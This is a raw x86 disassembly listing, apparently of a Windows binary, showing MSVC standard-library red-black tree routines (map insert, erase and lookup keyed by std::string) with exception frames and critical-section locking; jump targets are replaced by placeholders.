push ecx
mov ecx edi
call sub_41adf0
mov esi ecx
push esi
mov ecx edi
call sub_41a980
mov eax [ esi + 0x4 ]
mov [ eax + 0x38 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x38 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_41a980
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_41adf0
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_41bd40
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov esi [ edi + 0x4 ]
mov cl [ esi + 0x39 ]
test cl cl
mov al 0x1
mov [ esp + 0x10 ] al
jne r-xdata
test al al
mov esi edi
mov [ esp + 0x1c ] esi
je r-xdata
mov edi edi
lea edx [ esi + 0xc ]
push ebp
push edx
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp edi [ ecx ]
jne r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
pop ecx
retn 0x8
mov eax [ esp + 0x10 ]
push ebp
push edi
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebx
call sub_41bb90
mov edx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea ecx [ esp + 0x1c ]
call sub_41aa60
mov esi [ esp + 0x1c ]
push ebp
push edi
push 0x1
lea edx [ esp + 0x28 ]
push edx
mov ecx ebx
call sub_41bb90
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0xc ]
push eax
push ebp
mov edi esi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov cl [ esi + 0x39 ]
test cl cl
je r-xdata
sub_41be20
push 0xffffffff
push sub_431c68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
mov eax [ esp + 0x64 ]
push ebx
mov ebx ecx
mov cl [ eax + 0x39 ]
test cl cl
mov [ esp + 0x4 ] ebx
je r-xdata
push ebp
push esi
mov ebp eax
push edi
lea ecx [ esp + 0x74 ]
mov [ esp + 0x14 ] ebp
call sub_41aac0
mov eax [ ebp ]
mov cl [ eax + 0x39 ]
test cl cl
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x5c ] 0x0
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_40af50
push r--data
lea ecx [ esp + 0x30 ]
push ecx
call _CxxThrowException
mov edx [ ebp + 0x8 ]
mov cl [ edx + 0x39 ]
test cl cl
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x74 ]
cmp ecx ebp
mov edi [ ecx + 0x8 ]
jne r-xdata
mov edi eax
jmp r-xdata
mov al [ edi + 0x39 ]
test al al
mov esi [ ebp + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ ebp ]
mov [ ecx ] edx
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ edi + 0x4 ] esi
mov al [ edi + 0x39 ]
test al al
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebp
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ ebx + 0x4 ]
cmp [ ebx ] ebp
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax ] ebp
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x8 ] ebp
jne r-xdata
mov al [ edi + 0x39 ]
test al al
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x4 ]
mov [ ecx + 0x4 ] eax
mov dl [ ebp + 0x38 ]
mov al [ ecx + 0x38 ]
mov [ ecx + 0x38 ] dl
mov [ ebp + 0x38 ] al
mov al [ ebp + 0x38 ]
mov bl 0x1
cmp al bl
jne r-xdata
mov al [ edi + 0x39 ]
test al al
je r-xdata
push edi
call sub_41aa30
add esp 0x4
mov eax esi
jmp r-xdata
mov [ esp + 0x68 ] 0xffffffff
lea esi [ ebp + 0xc ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x68 ] 0x2
mov edi [ esi + 0x20 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
cmp edi [ eax + 0x4 ]
je r-xdata
push edi
call sub_41aa10
add esp 0x4
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] eax
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esp + 0x68 ] 0xffffffff
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebp
call ??3@YAXPAX@Z
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
cmp eax ebx
pop edi
pop esi
pop ebp
jbe r-xdata
mov ebp [ esi + 0x24 ]
cmp edi ebp
je r-xdata
mov [ edi + 0x38 ] bl
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x64 ]
mov [ eax ] ecx
mov ecx [ esp + 0x54 ]
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov eax [ esi + 0x20 ]
push eax
call ??3@YAXPAX@Z
mov ebp [ esp + 0x18 ]
add esp 0x4
lea esp [ esp ]
cmp [ edi + 0x38 ] bl
jne r-xdata
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add edi 0x1c
cmp edi ebp
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
mov dl [ eax + 0x38 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x38 ]
test dl dl
jne r-xdata
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov [ eax + 0x38 ] bl
push esi
mov [ esi + 0x38 ] 0x0
call sub_41a980
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov [ eax + 0x38 ] bl
push esi
mov [ esi + 0x38 ] 0x0
call sub_41adf0
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov edi esi
cmp edi edx
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x38 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x38 ] bl
jne r-xdata
jmp r-xdata
mov edx [ eax ]
cmp [ edx + 0x38 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x38 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x38 ] bl
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x38 ] bl
je r-xdata
mov dl [ esi + 0x38 ]
mov [ eax + 0x38 ] dl
mov [ esi + 0x38 ] bl
mov eax [ eax ]
push esi
mov [ eax + 0x38 ] bl
call sub_41a980
mov edx [ eax + 0x8 ]
mov [ edx + 0x38 ] bl
push eax
mov [ eax + 0x38 ] 0x0
call sub_41adf0
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x38 ] 0x0
mov dl [ esi + 0x38 ]
mov [ eax + 0x38 ] dl
mov [ esi + 0x38 ] bl
mov eax [ eax + 0x8 ]
push esi
mov [ eax + 0x38 ] bl
call sub_41adf0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x38 ] bl
push eax
mov [ eax + 0x38 ] 0x0
call sub_41a980
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x10 ]
sub_41c130
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x39 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_41c130
mov esi [ esi ]
mov ecx edi
call sub_41b880
push edi
call ??3@YAXPAX@Z
mov al [ esi + 0x39 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_41c170
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
push edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edi [ esp + 0x1c ]
push ebx
mov ebx [ esp + 0x1c ]
cmp ebx ecx
push ebp
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esi + 0x4 ]
mov edi [ esp + 0x14 ]
push eax
push ecx
push 0x1
push edi
mov ecx esi
call sub_41bb90
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
cmp ebx eax
jne r-xdata
lea edx [ ebx + 0xc ]
push edx
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
lea eax [ ebx + 0xc ]
push eax
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov eax [ eax + 0x8 ]
add eax 0xc
push edi
push eax
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
push edi
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
call sub_41bd40
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
pop ebp
pop ebx
pop edi
mov [ eax ] ecx
pop esi
add esp 0x8
retn 0xc
push edi
mov edi [ esp + 0x20 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_41bb90
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
lea eax [ ebx + 0xc ]
push edi
push eax
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
call sub_41aa60
mov ebp [ esp + 0x24 ]
push edi
lea edx [ ebp + 0xc ]
push edx
mov ecx esi
call sub_40aa60
test al al
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
push edi
mov edi [ esp + 0x20 ]
push ecx
push 0x0
push edi
mov ecx esi
call sub_41bb90
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
call sub_41aac0
mov ebp [ esp + 0x24 ]
cmp ebp [ esi + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x39 ]
push edi
mov edi [ esp + 0x20 ]
test cl cl
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
mov al [ edx + 0x39 ]
test al al
push edi
mov edi [ esp + 0x20 ]
mov ecx esi
je r-xdata
lea ecx [ ebp + 0xc ]
push ecx
push edi
mov ecx esi
call sub_40aa60
test al al
je r-xdata
push ebx
push 0x1
push edi
call sub_41bb90
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
push 0x0
push edi
call sub_41bb90
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
push 0x1
push edi
call sub_41bb90
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebx
push 0x0
push edi
call sub_41bb90
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
sub_41c330
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_41c130
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_41c360
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431c90
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebp
mov ebp [ esp + 0x50 ]
push esi
push edi
push ebp
mov edi ecx
call sub_41ace0
mov esi eax
cmp esi [ edi + 0x4 ]
je r-xdata
push ebx
xor ebx ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x54 ] ebx
lea eax [ esp + 0x10 ]
push eax
push ebp
lea ecx [ esp + 0x28 ]
call sub_41b7b0
mov [ esp + 0x54 ] 0x1
push eax
push esi
lea ecx [ esp + 0x64 ]
push ecx
mov ecx edi
call sub_41c170
mov esi [ eax ]
mov [ esp + 0x54 ] bl
lea ecx [ esp + 0x20 ]
call sub_41b760
mov [ esp + 0x54 ] 0xffffffff
lea ecx [ esp + 0x10 ]
call sub_41b5e0
pop ebx
lea eax [ esi + 0xc ]
push eax
push ebp
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ esp + 0x48 ]
pop edi
lea eax [ esi + 0x28 ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x48
retn 0x4
sub_41c410
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x39 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_41c130
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_41be20
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x39 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x39 ]
test dl dl
je r-xdata
jmp r-xdata
sub_41c4d0
push 0xffffffff
push sub_431ca8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push rw-data
mov esi ecx
mov [ esp + 0x8 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x4 ]
call sub_41c360
mov ecx eax
call sub_41b8c0
mov [ esp + 0x10 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_41c550
push 0xffffffff
push sub_431cea
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x14 ] 0x1
push rw-data
mov [ esp + 0xc ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x14 ] 0x2
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_41c360
mov esi [ esp + 0x1c ]
push eax
mov ecx esi
call sub_41b670
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x14 ] 0x1
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ esp + 0x14 ] 0x0
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x20
sub_41c5f0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41c410
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_41c620
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41c410
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_41c650
push 0xffffffff
push sub_431d08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41c410
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41c6b0
push 0xffffffff
push sub_431d2b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
add ecx 0x4
call sub_41c650
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41c6f0
push 0xffffffff
push sub_431d48
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_41b120
mov [ esi + 0x4 ] eax
mov [ eax + 0x39 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41c750
push 0xffffffff
push sub_431d6b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
call sub_41c6f0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41c7c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431d93
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
push rw-data
mov [ esp + 0x4 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ rw-data ]
push 0x10
call sub_42e3bc
add esp 0x4
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_41c750
jmp r-xdata
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] eax
sub_41c950
mov eax [ ecx ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x19 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x19 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_41ca80
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov dl [ ecx + 0x19 ]
test dl dl
jne r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
mov edx [ edx ]
push ebx
mov eax ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
cmp [ ecx + 0xc ] edx
jge r-xdata
pop ebx
mov bl [ ecx + 0x19 ]
test bl bl
je r-xdata
sub_41cab0
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov dl [ ecx + 0x19 ]
test dl dl
jne r-xdata
retn 0x4
mov edx [ esp + 0x4 ]
mov edx [ edx ]
push ebx
mov ecx [ ecx + 0x8 ]
mov eax ecx
mov ecx [ ecx ]
jmp r-xdata
cmp edx [ ecx + 0xc ]
jge r-xdata
pop ebx
mov bl [ ecx + 0x19 ]
test bl bl
je r-xdata
sub_41caf0
push ebp
mov ebp esp
push 0xffffffff
push sub_431da0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x1c
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x18 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] eax
cmp eax edx
je r-xdata
mov ebx 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x24 ] edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx edx
je r-xdata
mov [ eax ] edx
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0x2c ] edx
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x18 ] bl
mov [ eax + 0x19 ] dl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edx
sub_41cbc0
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x8
mov edx [ esp + 0x8 ]
mov edx [ edx ]
push ebx
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
pop ebx
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
sub_41cc00
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x8
mov edx [ esp + 0x8 ]
mov edx [ edx ]
push ebx
mov eax [ eax + 0x8 ]
mov ecx eax
mov eax [ eax ]
jmp r-xdata
cmp edx [ eax + 0xc ]
jge r-xdata
pop ebx
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
sub_41cc40
push esi
mov esi ecx
call sub_41caf0
mov [ esi + 0x4 ] eax
mov [ eax + 0x19 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_41cca0
push 0xffffffff
push sub_431dbb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
add ecx 0xc
call sub_415780
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41cce0
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
push ebx
mov bl [ eax + 0x19 ]
test bl bl
push esi
push edi
mov edi [ esp + 0x18 ]
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp edx eax
mov [ esp + 0x18 ] edx
je r-xdata
mov esi [ edi ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
mov edx [ eax ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
pop ecx
retn 0x8
mov ecx [ edi ]
cmp ecx [ edx + 0xc ]
jl r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ esp + 0x18 ]
mov edx [ eax ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
pop ecx
retn 0x8
cmp [ eax + 0xc ] esi
jge r-xdata
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
sub_41cd50
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
push ebx
mov bl [ eax + 0x19 ]
test bl bl
push esi
push edi
mov edi [ esp + 0x14 ]
jne r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
mov bl [ eax + 0x19 ]
test bl bl
jne r-xdata
mov esi [ edi ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop ebx
retn 0x8
mov esi [ edi ]
lea ebx [ ebx ]
mov eax [ eax + 0x8 ]
mov edx eax
mov eax [ eax ]
jmp r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
cmp esi [ eax + 0xc ]
jge r-xdata
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
cmp [ eax + 0xc ] esi
jge r-xdata
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
sub_41cdc0
push esi
mov esi ecx
call sub_41caf0
mov [ esi + 0x4 ] eax
mov [ eax + 0x19 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x8
sub_41ce10
push 0xffffffff
push sub_431dd8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push ebp
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea ebp [ eax + 0x4 ]
push ebp
xor edi edi
mov [ esp + 0x14 ] eax
